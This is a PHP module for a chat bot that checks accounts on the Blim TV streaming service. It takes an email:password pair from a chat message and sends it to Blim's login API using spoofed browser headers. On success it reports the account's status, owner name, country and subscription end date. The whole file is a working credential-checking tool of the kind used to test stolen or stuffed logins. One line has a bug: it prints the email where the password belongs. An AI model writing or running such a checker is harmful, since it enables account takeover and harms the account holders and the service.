<?php

use App\Config\ErrorLog;
use App\Config\StringUtils;
use App\Gate\CurlX;
use App\Models\Bot;

$query = Bot::GetContent($message, 6, [
    'send' => true,
    'chat_id' => $chat_id,
    'msg_id' => $message_id,
    'msg' => "<b><i>Blim TV Account</i> checker\nFormat:</b> <code>" . $t . "blim " . $cmd['form'] . "</code>",
]);

$acc = explode(":", $query);

if (count($acc) != 2) {
    Bot::SendMsg($chat_id, "<b>Invalid format\nFormat:</b> <code>" . $t . "blim email:password</code>", $message_id);
    exit;
}
if (!filter_var($acc[0], FILTER_VALIDATE_EMAIL)) {
    Bot::SendMsg($chat_id, "<b>Invalid email\nFormat:</b> <code>" . $t . "blim email:password</code>", $message_id);
    exit;
}

$result = CurlX::Post('https://api.blim.com/account/login', json_encode(['email' => $acc[0], 'password' => $acc[1], 'remember' => false, 'clientId' => 5]), ['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Host: api.blim.com', 'Accept: application/json, text/plain, */*', 'Origin: https://www.blim.com', 'Content-Type: application/json', 'Referer: https://www.blim.com/'])->body;
$res = json_decode($result, true);

if ($res == null) {
    // Error in cURL
    Bot::SendMsg($chat_id, "☠️ <i>Invalid json object</i>", $message_id);
}

if (isset($res['messages'][0]['value'])) {
    Bot::SendMsg($chat_id, '⚠️ <i>' . $res['messages'][0]['value'] . '</i>', $message_id);
    exit;
}
if (strpos($result, 'accessToken')) {
    Bot::SendMsg($chat_id, "<b>Email:</b> <code>" . $acc[0] . "</code>\n<b>Password:</b> <code>" . $acc[0] . "</code>\n<b>Status:</b> <code>Active✅</code>\n<b>Response:</b> <code>ACTIVE</code>\n<b>Name:</b> <code>" . $res['data']['firstName'] . "</code>\n<b>Country:</b> <code>" . $res['data']['package']['countryIsoCode'] . "(" . $res['data']['package']['currency']['isoCode'] . ")</code>\n<b>Subscription END:</b> <code>" . $res['data']['subscriptionEnd'] . "</code>", $message_id);
    exit;
}

Bot::SendMsg($chat_id, '<b><i>Unknown error</i></b>', $message_id);
ErrorLog::ReportToChannel('[blim] '.StringUtils::QuitHtml($result));
